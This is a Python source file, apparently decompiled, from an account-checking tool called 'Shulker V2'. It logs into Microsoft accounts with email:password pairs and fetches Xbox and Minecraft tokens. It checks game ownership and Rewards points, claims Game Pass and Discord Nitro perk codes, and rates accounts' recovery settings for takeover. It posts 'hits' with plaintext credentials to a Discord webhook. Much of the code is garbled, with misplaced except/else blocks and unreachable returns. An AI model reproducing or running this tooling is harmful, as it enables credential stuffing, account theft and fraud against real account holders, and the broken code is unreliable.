                    while banned_status is None and wait_cycles < max_wait:
                        # Pump the connection to read packets
                        try:
                            connection_instance.read_packet()
                        except:
                            pass
                        time.sleep(0.1)
                        wait_cycles += 1
                
                if banned_status == "Protocol_Retry":
                    continue # Try next version
                
                if banned_status is not None:
                    return banned_status

            except Exception as e:
                self.logger.debug(f"[Ban Check] Connection error: {e}")
                continue # Try next version or fail gracefully

        return "False" # Default to not banned if connections fail silently

class MinecraftChecker:
    """
    Check Minecraft ownership and profile
    """

    def __init__(self, session: requests.Session, rate_limiter: Optional[object] = None):
        """
        Initialize Minecraft checker

        Args:
            session: Authenticated requests session
            rate_limiter: Optional rate limiter instance (uses global if None)
        """
        self.logger = get_logger()
        self.session = session
        self.rate_limiter = rate_limiter if rate_limiter else get_rate_limiter()

    def get_xbox_tokens(self, rps_token: str) -> Optional[Tuple[str, str]]:
        """
        Get Xbox Live and XSTS tokens from RPS token

        Args:
            rps_token: RPS token from Microsoft OAuth

        Returns:
            (uhs, xsts_token) or None
        """
        self.logger.debug("Getting Xbox Live token...")
        
        # 1. Get Xbox Live User Token
        url_user = "https://user.auth.xboxlive.com/user/authenticate"
        headers = {
            "Content-Type": "application/json",
            "Accept": "application/json"
        }
        data_user = {
            "Properties": {
                "AuthMethod": "RPS",
                "SiteName": "user.auth.xboxlive.com",
                "RpsTicket": rps_token
            },
            "RelyingParty": "http://auth.xboxlive.com",
            "TokenType": "JWT"
        }

        try:
            response = self.session.post(url_user, json=data_user, headers=headers, timeout=30)
            if response.status_code != 200:
                self.logger.debug(f"Xbox Live auth failed: {response.status_code} - {response.text}")
                return None
            
            xbox_data = response.json()
            xbox_token = xbox_data["Token"]
            uhs = xbox_data["DisplayClaims"]["xui"][0]["uhs"]

        except Exception as e:
            self.logger.debug(f"Xbox token error: {str(e)}")
            return None

        # 2. Get XSTS Token
        self.logger.debug("Getting XSTS token...")
        url_xsts = "https://xsts.auth.xboxlive.com/xsts/authorize"
        data_xsts = {
            "Properties": {
                "SandboxId": "RETAIL",
                "UserTokens": [xbox_token]
            },
            "RelyingParty": "rp://api.minecraftservices.com/",
            "TokenType": "JWT"
        }

        try:
            response = self.session.post(url_xsts, json=data_xsts, headers=headers, timeout=30)
            if response.status_code == 401:
                self.logger.debug("XSTS auth failed: 401 Unauthorized (Child account or region lock?)")
                return None
            
            if response.status_code != 200:
                self.logger.debug(f"XSTS auth failed: {response.status_code} - {response.text}")
                return None

            xsts_data = response.json()
            xsts_token = xsts_data["Token"]
            
            self.logger.debug("✅ Xbox tokens acquired")
            return (uhs, xsts_token)

        except Exception as e:
            self.logger.debug(f"XSTS token error: {str(e)}")
            return None

    def get_minecraft_xsts_token(self, user_token: str) -> Tuple[Optional[str], Optional[str]]:
        """
        Get XSTS token specifically scoped for Minecraft services

        Args:
            user_token: Xbox user token

        Returns:
            (uhs, xsts_token) or (None, None) if failed
        """
        self.logger.debug("Getting Minecraft-scoped XSTS token...")
        url = "https://xsts.auth.xboxlive.com/xsts/authorize"
        headers = {"Content-Type": "application/json", "Accept": "application/json"}
        data = {
            "Properties": {
                "SandboxId": "RETAIL",
                "UserTokens": [user_token]
            },
            "RelyingParty": "rp://api.minecraftservices.com/",
            "TokenType": "JWT"
        }

        try:
            response = self.session.post(url, json=data, headers=headers)
            
            if response.status_code == 200:
                json_data = response.json()
                uhs = json_data["DisplayClaims"]["xui"][0]["uhs"]
                xsts_token = json_data["Token"]
                self.logger.debug("✅ Minecraft XSTS token acquired")
                return uhs, xsts_token
            else:
                self.logger.debug(f"Minecraft XSTS auth failed: {response.status_code}")
                return None, None
                
        except Exception as e:
            self.logger.debug(f"Minecraft XSTS token error: {e}")
            return None, None

    def get_minecraft_token(self, rps_token: str) -> Optional[str]:
        """
        Get Minecraft access token with rate limit handling
        Uses correct Minecraft-scoped XSTS token like Shulker.py

        Args:
            rps_token: RPS token from Microsoft OAuth

        Returns:
            Minecraft access token or None
        """
        # Step 1: Get Xbox and XSTS tokens
        tokens = self.get_xbox_tokens(rps_token)
        if not tokens:
            self.logger.debug("Failed to get Xbox user token")
            return None
        
        uhs, xsts_token = tokens
        if not xsts_token:
            self.logger.debug("Failed to get Minecraft XSTS token")
            return None

        self.logger.debug("Getting Minecraft access token... (attempt 1/3)")
        
        url = "https://api.minecraftservices.com/authentication/login_with_xbox"
        payload = {
            "identityToken": f"XBL3.0 x={uhs};{xsts_token}"
        }

        # Rate limiting logic
        max_retries = 3
        base_delay = 1.5

        for attempt in range(max_retries):
            # Check global rate limiter for api.minecraftservices.com
            domain = "api.minecraftservices.com"
            wait_until = self.rate_limiter.rate_limited_until.get(domain, 0)
            if time.time() < wait_until:
                wait_time = wait_until - time.time()
                self.logger.warning(f"⏰ Minecraft API rate limited. Waiting {wait_time:.1f}s...")
                time.sleep(wait_time)

            try:
                response = self.session.post(url, json=payload, timeout=30)
                
                if response.status_code == 200:
                    data = response.json()
                    access_token = data["access_token"]
                    self.logger.debug("✅ Minecraft token acquired")
                    return access_token
                
                elif response.status_code == 429:
                    # Handle Rate Limit
                    retry_after = int(response.headers.get("Retry-After", 5))
                    wait_seconds = min(retry_after, 60) # Cap at 60s
                    self.logger.warning(f"⏰ Rate limited (429). Waiting {wait_seconds}s before retry...")
                    
                    self.rate_limiter.mark_rate_limited(domain, wait_seconds)
                    time.sleep(wait_seconds)
                    continue

                elif response.status_code == 401:
                     # Usually means XSTS token issue
                     self.logger.debug("Minecraft auth failed: 401 Unauthorized - XSTS token may not be scoped for Minecraft")
                     return None
                
                else:
                    self.logger.debug(f"Minecraft auth failed: {response.status_code}")
                    return None

            except Exception as e:
                self.logger.debug(f"Minecraft token error: {str(e)}")
                time.sleep(1)
        
        self.logger.error("❌ Max retries exceeded for Minecraft token")
        return None

    def check_ownership(self, mc_token: str) -> Dict:
        """
        Check Minecraft ownership (Java/Bedrock/Dungeons)
        Distinguishes OWNED vs Game Pass access

        Args:
            mc_token: Minecraft access token

        Returns:
            Dictionary with ownership info
        """
        self.logger.debug("Checking Minecraft ownership...")
        url = "https://api.minecraftservices.com/entitlements/license"
        headers = {"Authorization": f"Bearer {mc_token}"}
        
        result = self._no_ownership()

        try:
            response = self.session.get(url, headers=headers, timeout=15)
            if response.status_code != 200:
                self.logger.debug(f"Ownership check failed: {response.status_code}")
                return result
            
            data = response.json()
            items = data.get("items", [])
            
            raw_items = []

            for item in items:
                name = item.get("name")
                source = item.get("source", "unknown")
                raw_items.append(f"{name}({source})")

                # Java Edition
                if name == "game_minecraft":
                    result["minecraft_java_owned"] = True
                    # Check if Game Pass
                    if source == "GBP":
                        result["minecraft_java_gamepass"] = True

                # Product bundle (Java + Bedrock)
                elif name == "product_minecraft":
                    if source == "PURCHASE" or source == "MCPURCHASE":
                        result["minecraft_java_owned"] = True
                        result["minecraft_bedrock_owned"] = True
                    elif source == "GBP":
                        result["minecraft_java_owned"] = True
                        result["minecraft_bedrock_owned"] = True
                        result["minecraft_java_gamepass"] = True
                        result["minecraft_bedrock_gamepass"] = True

                # Bedrock Specific
                elif name == "product_minecraft_bedrock":
                    result["minecraft_bedrock_owned"] = True
                
                # Dungeons
                elif name == "product_dungeons":
                    result["minecraft_dungeons_owned"] = True

                # Game Pass specific checks
                elif name == "product_game_pass_pc":
                    result["gamepass_pc"] = True
                elif name == "product_game_pass_ultimate":
                    result["gamepass_ultimate"] = True

            result["raw_items"] = raw_items
            self.logger.debug(f"✅ Ownership checked: Java={result['minecraft_java_owned']}, Bedrock={result['minecraft_bedrock_owned']}")
            self.logger.debug(f"Raw items: {raw_items}")
            return result

        except Exception as e:
            self.logger.debug(f"Ownership check error: {e}")
            return result

    def get_profile(self, mc_token: str) -> Dict:
        """
        Get Minecraft profile (username, UUID, capes, name change)

        Args:
            mc_token: Minecraft access token

        Returns:
            Dictionary with profile info
        """
        self.logger.debug("Getting Minecraft profile...")
        result = self._no_profile()

        # 1. Get Profile (UUID, Name, Capes)
        try:
            url_profile = "https://api.minecraftservices.com/minecraft/profile"
            headers = {"Authorization": f"Bearer {mc_token}"}
            
            response = self.session.get(url_profile, headers=headers, timeout=15)
            if response.status_code != 200:
                self.logger.debug(f"Profile fetch failed: {response.status_code}")
                return result

            profile_data = response.json()
            result["id"] = profile_data.get("id")
            result["username"] = profile_data.get("name")
            
            for cape in profile_data.get("capes", []):
                result["capes"].append(f"{cape.get('alias')} ({cape.get('state')})")
            
            self.logger.debug(f"Profile: {result['username']} ({result['id']})")

        except Exception as e:
            self.logger.debug(f"Profile fetch error: {e}")
            return result

        # 2. Check Name Change Status
        try:
            url_nc = "https://api.minecraftservices.com/minecraft/profile/namechange"
            response = self.session.get(url_nc, headers=headers, timeout=15)
            
            if response.status_code == 200:
                nc_data = response.json()
                result["name_changeable"] = nc_data.get("nameChangeAllowed", False)
                # Convert changedAt date if needed, usually stored as string
                result["name_change_date"] = nc_data.get("changedAt")
                
                self.logger.debug(f"Name changeable: {result['name_changeable']}")

        except Exception as e:
            self.logger.debug(f"Name change check error: {e}")

        self.logger.debug("✅ Profile retrieved")
        return result

    def _no_ownership(self) -> Dict:
        """Return empty ownership"""
        return {
            "minecraft_java_owned": False,
            "minecraft_bedrock_owned": False,
            "minecraft_dungeons_owned": False,
            "minecraft_java_gamepass": False,
            "minecraft_bedrock_gamepass": False,
            "minecraft_dungeons_gamepass": False,
            "gamepass_ultimate": False,
            "gamepass_pc": False,
            "raw_items": []
        }

    def _no_profile(self) -> Dict:
        """Return empty profile"""
        return {
            "id": None,
            "username": None,
            "uuid": None,
            "capes": [],
            "name_changeable": False,
            "name_change_date": None
        }

    def check_minecraft(self, rps_token: str) -> Optional[Dict]:
        """
        Complete Minecraft check (token + ownership + profile)
        Uses correct Minecraft-scoped XSTS token like Shulker.py

        Args:
            rps_token: RPS token from Microsoft OAuth

        Returns:
            Dictionary with ownership and profile info, or None if failed
        """
        # 1. Get Access Token
        mc_token = self.get_minecraft_token(rps_token)
        if not mc_token:
            self.logger.debug("Failed to get Minecraft token")
            return None

        result = {}

        # 2. Check Ownership
        try:
            ownership = self.check_ownership(mc_token)
            result.update(ownership)
        except Exception as e:
            self.logger.debug(f"Ownership check error inside check_minecraft: {e}")
            result.update(self._no_ownership())

        # 3. Get Profile (only if they own Java usually, but we check anyway)
        try:
            profile = self.get_profile(mc_token)
            result.update(profile)
        except Exception as e:
            self.logger.debug(f"Profile check error inside check_minecraft: {e}")
            result.update(self._no_profile())

        result["access_token"] = mc_token
        return result

class MSRewardsChecker:
    """Check Microsoft Rewards points using rewards.bing.com"""

    def __init__(self, session: requests.Session=None):
        """\nInitialize MS Rewards checker\n\nNote: This checker creates its own session for Bing Rewards\n"""  # inserted
        return

    def check_rewards(self, email: str, password: str) -> Dict:
        """\nCheck Microsoft Rewards points balance\n\nArgs:\n    email: Account email\n    password: Account password\n\nReturns:\n    Dictionary with rewards info\n"""  # inserted
        rewards_session = requests.Session()
        rewards_session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36', 'Accept-Language': 'en-US,en;q=0.9'})
        try:
            logger.debug('Getting Bing Rewards OAuth tokens...')
            initial_url = 'https://rewards.bing.com/'
            response = rewards_session.get(initial_url, timeout=15, allow_redirects=True)
            signin_url = 'https://rewards.bing.com/Signin?idru=%2F'
            response = rewards_session.get(signin_url, timeout=15, allow_redirects=True)
            text = response.text
            match = re.search('value=\\\\\\\"(.+?)\\\\\\\"', text, re.S) or re.search('value=\"(.+?)\"', text, re.S)
            if not match:
                logger.warning('Could not extract PPFT token for Rewards')
        except Exception as e:
            logger.error(f'MS Rewards check error: {e}')
            return self._no_rewards(f'Error: {str(e)}')
    pass
    def _rewards_login(self, session: requests.Session, email: str, password: str, url_post: str, ppft_token: str, max_retries: int=3) -> bool:
        """\nPerform Microsoft login specifically for Rewards\n"""  # inserted
        tries = 0
        if tries < max_retries:
            try:
                data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft_token}
                login_request = session.post(url_post, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
                if 'rewards.bing.com' in login_request.url:
                    logger.debug('Successfully authenticated with Bing Rewards')
                return True
        return False
            except Exception as e:
                logger.debug(f'Login attempt {tries + 1} exception: {e}')
                tries += 1
                time.sleep(1)

    def _no_rewards(self, reason: str='Unknown') -> Dict:
        """Return empty rewards data"""  # inserted
        return {'available_points': 0, 'lifetime_points': 0, 'redeemed_points': 0, 'error': reason}

class NitroChecker:
    """Check Discord Nitro perk and fetch promo codes"""

    def __init__(self, session: requests.Session):
        """\nInitialize Nitro checker\n\nArgs:\n    session: Authenticated requests session\n"""  # inserted
        self.session = session

    def check_nitro_perk(self, has_gpu: bool, uhs: str=None, xsts_token: str=None) -> Dict:
        """\nCheck Discord Nitro perk availability and fetch promo code\n\nArgs:\n    has_gpu: Whether account has Game Pass Ultimate\n    uhs: Xbox UHS (required if has_gpu=True)\n    xsts_token: Xbox Live XSTS token (required if has_gpu=True)\n\nReturns:\n    Dictionary with Nitro info including promo code\n"""  # inserted
        if not has_gpu:
            logger.debug('Account doesn\'t have Game Pass Ultimate - skipping Nitro check')
            return {'eligible': False, 'status': 'not_eligible', 'redemption_link': None, 'promo_code': None, 'error': None}

    def _extract_promo_code(self, redemption_link: str) -> Optional[str]:
        """\nExtract promo code from redemption link\n\nArgs:\n    redemption_link: Discord redemption URL\n\nReturns:\n    Promo code or None\n"""  # inserted
        if not redemption_link:
            pass  # postinserted
        return None

    def _fetch_promo_from_link(self, link: str) -> Optional[str]:
        """\nFetch promo code by following redemption link\n\nArgs:\n    link: Redemption URL\n\nReturns:\n    Promo code or None\n"""  # inserted
        try:
            logger.debug(f'Fetching promo code from link: {link[:50]}...')
            response = self.session.get(link, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}, allow_redirects=True, timeout=15)
            if response.status_code!= 200:
                logger.warning(f'Failed to fetch promo link: {response.status_code}')
            return None
        except Exception as e:
            logger.error(f'Error fetching promo from link: {e}')
            return None

    def _claim_and_get_promo(self, offer: Dict, auth_header: str) -> Dict:
        """\nClaim an available Nitro perk and get promo code\n\nArgs:\n    offer: Offer data from API\n    auth_header: Xbox authorization header\n\nReturns:\n    Dictionary with link and promo_code\n"""  # inserted
        try:
            offer_id = offer.get('offerId')
            logger.info(f'Attempting to claim Nitro perk: {offer_id}')
            claim_response = self.session.post(f'https://profile.gamepass.com/v2/offers/{offer_id}/claim', headers={'Authorization': auth_header, 'Content-Type': 'application/json', 'User-Agent': 'okhttp/4.12.0'}, timeout=30)
            if claim_response.status_code == 200:
                claim_data = claim_response.json()
                redemption_link = claim_data.get('resource') or offer.get('resource')
                logger.info('✅ Successfully claimed Nitro perk!')
                promo_code = self._extract_promo_code(redemption_link)
                logger.info(f'🎁 Nitro Promo Code: {promo_code}') if promo_code else {'link': redemption_link, 'promo_code': promo_code}
        except Exception as e:
            logger.error(f'Error claiming Nitro perk: {e}')
            return {'link': offer.get('resource'), 'promo_code': None}

    def _error_result(self, error_msg: str) -> Dict:
        """Return error result"""  # inserted
        return {'eligible': False, 'status': 'error', 'redemption_link': None, 'promo_code': None, 'error': error_msg}

    def check_nitro(self, uhs: str, xsts_token: str) -> Dict:
        """\nCheck Discord Nitro (wrapper that auto-detects GPU)\n\nArgs:\n    uhs: Xbox UHS token\n    xsts_token: XSTS token\n\nReturns:\n    Dictionary with Nitro info\n"""  # inserted
        try:
            auth_header = f'XBL3.0 x={uhs};{xsts_token}'
            response = self.session.get('https://profile.gamepass.com/v2/offers', headers={'Authorization': auth_header, 'Content-Type': 'application/json', 'User-Agent': 'okhttp/4.12.0'}, timeout=30)
            has_gpu = False
            if response.status_code == 200:
                try:
                    perks_data = response.json()
                    if perks_data and isinstance(perks_data, dict):
                        offers = perks_data.get('offers', [])
                        if offers:
                            has_gpu = True
                            logger.debug('Account has Game Pass Ultimate (detected via perks API)')
            else:  # inserted
                return self.check_nitro_perk(has_gpu, uhs, xsts_token)
                except (ValueError, AttributeError) as e:
                    logger.debug(f'Failed to parse perks data: {e}')
        except Exception as e:
            logger.error(f'Error checking Nitro: {e}')
            return self._error_result(str(e))

class SecurityChecker:
    """Check Microsoft account security status"""

    def __init__(self, session: requests.Session):
        """
Initialize security checker

Args:
    session: Authenticated requests session
"""
        self.session = session

    def check_security_info(self) -> Dict:
        """
Check account security status

Returns:
    Dictionary with security info:
    {
        'status': 'pending_change' | '2fa_enabled' | 'email_phone_only' | 'unknown',
        'has_2fa': bool or None,
        'recovery_email': str or None,
        'recovery_phone': str or None,
        'mark_lost_chance': 'will_fail' | 'possible' | 'guaranteed' | 'unknown'
    }
"""
        try:
            logger.debug('Checking security info...')
            response = self.session.get('https://account.live.com/proofs/manage', allow_redirects=True, timeout=15)
            if response.status_code != 200:
                logger.warning(f'Security page returned {response.status_code}')
        except Exception as e:
            logger.error(f'Security check error: {e}')
            return self._unknown_status()

    def _unknown_status(self) -> Dict:
        """Return unknown status"""
        return {'status': 'error', 'has_2fa': None, 'recovery_email': None, 'recovery_phone': None, 'mark_lost_chance': 'unknown', 'reason': 'Failed to check security status'}

    def format_security_status(self, security_info: Dict) -> str:
        """
Format security info for display

Args:
    security_info: Security info dictionary

Returns:
    Formatted string
"""
        status = security_info['status']
        if status == 'pending_change':
            pass
        return '⚠️  PENDING SECURITY CHANGE - Mark Lost will fail'

class XboxChecker:
    """Check Xbox profile and get tokens"""

    def __init__(self, session: requests.Session, rate_limiter=None):
        """\nInitialize with requests session\n\nArgs:\n    session: Authenticated requests session\n    rate_limiter: Optional rate limiter instance (uses global if None)\n"""  # inserted
        self.session = session
        self.rate_limiter = rate_limiter or get_rate_limiter()

    def get_xbox_tokens(self, rps_token: str, max_retries: int=3) -> Tuple[Optional[str], Optional[str]]:
        """\nGet Xbox Live UHS and XSTS tokens with retry logic\n\nArgs:\n    rps_token: RPS token from Microsoft OAuth\n    max_retries: Maximum number of retry attempts\n\nReturns:\n    (uhs, xsts_token) or (None, None) if failed\n"""  # inserted
        base_delay = 2
        for attempt in range(max_retries):
            try:
                user_token = self._get_user_token(rps_token, attempt)
                if not user_token:
                    if attempt < max_retries - 1:
                        wait_time = base_delay * 2 ** attempt
                        logger.debug(f'User token failed, retrying in {wait_time}s... (attempt {attempt + 1}/{max_retries})')
                        time.sleep(wait_time)
                return (None, None)
        else:  # inserted
            return (None, None)
        except Exception as e:
            if attempt < max_retries - 1:
                wait_time = base_delay * 2 ** attempt
                logger.warning(f'Xbox tokens error (attempt {attempt + 1}/{max_retries}): {e}. Retrying in {wait_time}s...')
                time.sleep(wait_time)
            else:  # inserted
                logger.error(f'Xbox tokens error after {max_retries} attempts: {e}')
                return (None, None)

    def get_gamertag(self, uhs: str, xsts_token: str) -> Optional[str]:
        """Get Xbox gamertag"""  # inserted
        try:
            auth_header = f'XBL3.0 x={uhs};{xsts_token}'
            response = self.session.get('https://profile.xboxlive.com/users/me/profile/settings', headers={'Authorization': auth_header, 'x-xbl-contract-version': '3'}, params={'settings': 'Gamertag'}, timeout=30)
            if response.status_code == 200:
                data = response.json()
                settings = data.get('profileUsers', [{}])[0].get('settings', [])
                for setting in settings:
                    if setting.get('id') == 'Gamertag':
                        pass  # postinserted
                    else:  # inserted
                        return setting.get('value')
            return
        except Exception as e:
            logger.error(f'Gamertag fetch error: {e}')

    def _get_user_token(self, rps_token: str, attempt: int=0) -> Optional[str]:
        """\nGet Xbox User Token from RPS token with rate limiting\n\nArgs:\n    rps_token: RPS token from Microsoft OAuth\n    attempt: Current retry attempt number\n"""  # inserted
        try:
            self.rate_limiter.wait_for_domain('https://user.auth.xboxlive.com/user/authenticate') if self.rate_limiter else None
            response = self.session.post('https://user.auth.xboxlive.com/user/authenticate', json={'RelyingParty': 'http://auth.xboxlive.com', 'TokenType': 'JWT', 'Properties': {'AuthMethod': 'RPS', 'SiteName': 'user.auth.xboxlive.com', 'RpsTicket': rps_token}}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=30)
            if response.status_code == 200:
                data = response.json()
                token = data.get('Token')
                if token:
                    logger.debug('✅ Xbox user token acquired')
            return None
        except requests.exceptions.Timeout:
            logger.warning('⚠️ User token request timed out')

    def _get_xsts_token(self, user_token: str, attempt: int=0) -> Tuple[Optional[str], Optional[str]]:
        """\nGet XSTS token from user token with rate limiting\n\nArgs:\n    user_token: Xbox user token\n    attempt: Current retry attempt number\n"""  # inserted
        try:
            self.rate_limiter.wait_for_domain('https://xsts.auth.xboxlive.com/xsts/authorize') if self.rate_limiter else None
            response = self.session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={'RelyingParty': 'http://xboxlive.com', 'TokenType': 'JWT', 'Properties': {'UserTokens': [user_token], 'SandboxId': 'RETAIL'}}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=30)
            if response.status_code == 200:
                data = response.json()
                uhs = data.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs')
                xsts_token = data.get('Token')
                if uhs and xsts_token:
                    logger.debug('✅ XSTS token acquired')
                    return (uhs, xsts_token)
            return (None, None)
        except requests.exceptions.Timeout:
            logger.warning('⚠️ XSTS token request timed out')
            pass
            return (None, None)

class XboxCodesFetcher:
    """Fetch Xbox Game Pass codes"""

    def __init__(self, session: requests.Session):
        """Initialize with requests session"""  # inserted
        self.session = session

    def fetch_codes(self, uhs: str, xsts_token: str) -> List[Dict]:
        """\nFetch all Xbox codes from Game Pass perks\n\nArgs:\n    uhs: Xbox UHS token\n    xsts_token: XSTS token\n\nReturns:\n    List of codes with details:\n    [\n        {\n            \'code\': \'ABC123...\',\n            \'offer_id\': \'...\',\n            \'status\': \'claimed\' or \'available\',\n            \'claimed_date\': \'2024-12-09\'\n        },\n        ...\n    ]\n"""  # inserted
        try:
            logger.debug('🎁 Fetching Xbox Game Pass perks...')
            perks_data = self._get_perks_list(uhs, xsts_token)
            if not perks_data:
                logger.debug('No perks data returned')
                return []
        except Exception as e:
            logger.error(f'Xbox codes fetch error: {e}')
            return []

    def _get_perks_list(self, uhs: str, xsts_token: str) -> Optional[Dict]:
        """Get list of all perks"""  # inserted
        try:
            auth_header = f'XBL3.0 x={uhs};{xsts_token}'
            response = self.session.get('https://profile.gamepass.com/v2/offers', headers={'Authorization': auth_header, 'Content-Type': 'application/json', 'User-Agent': 'okhttp/4.12.0'}, timeout=30)
            return response.json() if response.status_code == 200 else False
        except Exception as e:
            logger.error(f'Get perks list error: {e}')

    def _get_offer_details(self, uhs: str, xsts_token: str, offer_id: str) -> Optional[Dict]:
        """Get detailed info for specific offer"""  # inserted
        try:
            auth_header = f'XBL3.0 x={uhs};{xsts_token}'
            response = self.session.get(f'https://profile.gamepass.com/v2/offers/{offer_id}', headers={'Authorization': auth_header, 'Content-Type': 'application/json', 'User-Agent': 'okhttp/4.12.0'}, timeout=30)
            return response.json() if response.status_code == 200 else False
        except Exception as e:
            logger.debug(f'Get offer details error: {e}')

    def _claim_offer(self, uhs: str, xsts_token: str, offer_id: str) -> Optional[str]:
        """Claim an available offer and get the code (EXACT copy of testing.py claim_perk)"""  # inserted
        try:
            auth_header = f'XBL3.0 x={uhs};{xsts_token}'
            cv_base = ''.join(random.choices(string.ascii_letters + string.digits, k=22))
            ms_cv = f'{cv_base}.0'
            original_headers = dict(self.session.headers)
            self.session.headers.clear()
            try:
                response = self.session.post(f'https://profile.gamepass.com/v2/offers/{offer_id}', headers={'Authorization': auth_header, 'content-type': 'application/json', 'User-Agent': 'okhttp/4.12.0', 'ms-cv': ms_cv, 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'profile.gamepass.com', 'Content-Length': '0'}, data='', timeout=30)
                self.session.headers.clear()
                self.session.headers.update(original_headers)
                if response.status_code == 200:
                    data = response.json()
                    code = data.get('resource')
                    if code:
                        logger.debug(f'✅ Claimed code: {code}')
                        return code
        except Exception as e:
            logger.error(f'Claim offer error: {e}')
            import traceback
            logger.debug(f'Traceback: {traceback.format_exc()}')

class DiscordWebhook:
    """Send beautiful embeds to Discord webhook"""

    def __init__(self, config: dict):
        """\nInitialize Discord webhook\n\nConfig format:\n{\n    \'enabled\': True,\n    \'webhook_url\': \'https://discord.com/api/webhooks/...\',\n    \'send_all_hits\': False,  # Send every valid account\n    \'send_minecraft\': True,   # Send Minecraft hits\n    \'send_nitro\': True,       # Send Nitro hits\n    \'send_2fa\': False,        # Send 2FA accounts\n    \'send_rewards\': True,     # Send MS Rewards > threshold\n    \'rewards_threshold\': 500, # Min points to send\n    \'send_gamepass\': True,    # Send Game Pass hits\n    \'username\': \'Shulker V2\', # Bot username\n    \'avatar_url\': \'\',         # Bot avatar (optional)\n    \'use_custom_embed\': False, # Use custom embed template\n    \'embed_title\': \'...\',     # Custom embed title\n    \'embed_description\': \'...\', # Custom embed description\n    \'embed_color\': \'0x57F287\', # Custom embed color (hex)\n    \'embed_footer\': \'...\',    # Custom embed footer\n    \'embed_fields\': [...]     # Custom embed fields\n}\n"""  # inserted
        self.enabled = config.get('enabled', False)
        self.webhook_url = config.get('webhook_url', '')
        self.send_all_hits = config.get('send_all_hits', False)
        self.send_minecraft = config.get('send_minecraft', True)
        self.send_nitro = config.get('send_nitro', True)
        self.send_2fa = config.get('send_2fa', False)
        self.send_rewards = config.get('send_rewards', True)
        self.rewards_threshold = config.get('rewards_threshold', 500)
        self.send_gamepass = config.get('send_gamepass', True)
        self.send_hypixel = config.get('send_hypixel', False)
        self.send_donut = config.get('send_donut', False)
        self.username = config.get('username', 'Shulker V2')
        self.avatar_url = config.get('avatar_url', '')
        self.config = config
        self.last_send_time = 0
        self.min_delay = 1.0
        if self.enabled and (not self.webhook_url):
            logger.error('❌ Discord webhook enabled but no URL provided!')
            self.enabled = False
        if self.enabled:
            logger.info('🔔 Discord webhook: ENABLED')
            logger.info('🎨 Custom embed template: ENABLED') if config.get('use_custom_embed', False) else False
            self._test_webhook()
        return None

    def _test_webhook(self):
        """Test webhook on startup"""  # inserted
        try:
            data = {'username': self.username, 'avatar_url': self.avatar_url, 'content': '✅ **Shulker V2 Started** - Webhook connection successful!'}
            response = requests.post(self.webhook_url, json=data, timeout=10)
            if response.status_code in [200, 204]:
                logger.info('✅ Discord webhook test successful!')
            return None
        except Exception as e:
            logger.error(f'❌ Discord webhook test failed: {e}')
            self.enabled = False

    def send_hit(self, account_data: Dict):
        """Send hit to Discord if it matches filters"""  # inserted
        if not self.enabled:
            pass  # postinserted
        return None

    def _should_send(self, account_data: Dict) -> bool:
        """Check if account meets send criteria"""  # inserted
        if self.send_all_hits:
            pass  # postinserted
        return True

    def _create_embed(self, account_data: Dict) -> Dict:
        """Create beautiful Discord embed - supports custom templates"""  # inserted
        use_custom = self.config.get('use_custom_embed', False)
        return self._create_custom_embed(account_data) if use_custom else None

    def _create_custom_embed(self, account_data: Dict) -> Dict:
        """Create embed from custom template"""  # inserted
        title_template = self.config.get('embed_title', '🎮 NEW HIT - {email}')
        desc_template = self.config.get('embed_description', '**Credentials:** `{email}:{password}`')
        footer_template = self.config.get('embed_footer', 'Shulker V2 • {timestamp}')
        color_template = self.config.get('embed_color', '')
        custom_fields = self.config.get('embed_fields', [])
        title = self._replace_variables(title_template, account_data)
        description = self._replace_variables(desc_template, account_data)
        footer_text = self._replace_variables(footer_template, account_data)
        color = self._get_embed_color(account_data)
        if color_template:
            try:
                if color_template.startswith('0x'):
                    color = int(color_template, 16)
            fields = []
            for field_template in custom_fields:
                field_name = self._replace_variables(field_template.get('name', ''), account_data)
                field_value = self._replace_variables(field_template.get('value', ''), account_data)
                field_inline = field_template.get('inline', False)
                if field_name and field_value:
                    pass  # postinserted
                else:  # inserted
                    fields.append({'name': field_name, 'value': field_value, 'inline': field_inline})
            footer = {'text': footer_text}
            footer_icon = self.config.get('embed_footer_icon', '')
            if footer_icon:
                footer['icon_url'] = footer_icon
            embed = {'title': title, 'description': description, 'color': color, 'fields': fields, 'footer': footer, 'timestamp': datetime.utcnow().isoformat()}
            return embed
            except:
                pass

    def _replace_variables(self, template: str, account_data: Dict) -> str:
        """Replace variables in template string"""  # inserted
        if not template:
            pass  # postinserted
        return ''

    def _create_default_embed(self, account_data: Dict) -> Dict:
        """Create default beautiful Discord embed"""  # inserted
        email = account_data.get('email', 'Unknown')
        password = account_data.get('password', '')
        color = self._get_embed_color(account_data)
        title = '🎮 NEW HIT - ' + email
        description = f'**Credentials:** `{email}:{password}`\n\n'
        fields = []
        minecraft = account_data.get('minecraft', {})
        if minecraft:
            ownership = minecraft.get('ownership', {})
            profile = minecraft.get('profile', {})
            minecraft_value = []
            minecraft_value.append('✅ Java OWNED') if ownership.get('minecraft_java_owned') else None
            minecraft_value.append('✅ Bedrock OWNED') if ownership.get('minecraft_bedrock_owned') else None
            minecraft_value.append('🎮 Java Game Pass') if ownership.get('minecraft_java_gamepass') else None
            minecraft_value.append('🎮 Bedrock Game Pass') if ownership.get('minecraft_bedrock_gamepass') else None
            minecraft_value.append('❌ No Minecraft') if not minecraft_value else None
            minecraft_value.append(f"**Username:** {profile.get('username')}") if profile.get('username') else minecraft_value.append(f"List{profile.get('username')}")
            fields.append({'name': '🎮 Minecraft', 'value': '\n'.join(minecraft_value), 'inline': True})
        security = account_data.get('security', {})
        if security:
            status = security.get('status', 'Unknown')
            if status == 'CLEAN':
                security_text = '✅ Clean (No 2FA)'
            fields.append({'name': '🔒 Security', 'value': security_text, 'inline': True})
        xbox = account_data.get('xbox', {})
        if xbox and xbox.get('gamertag'):
            fields.append({'name': '🎮 Xbox', 'value': f"**Gamertag:** {xbox.get('gamertag')}", 'inline': True})
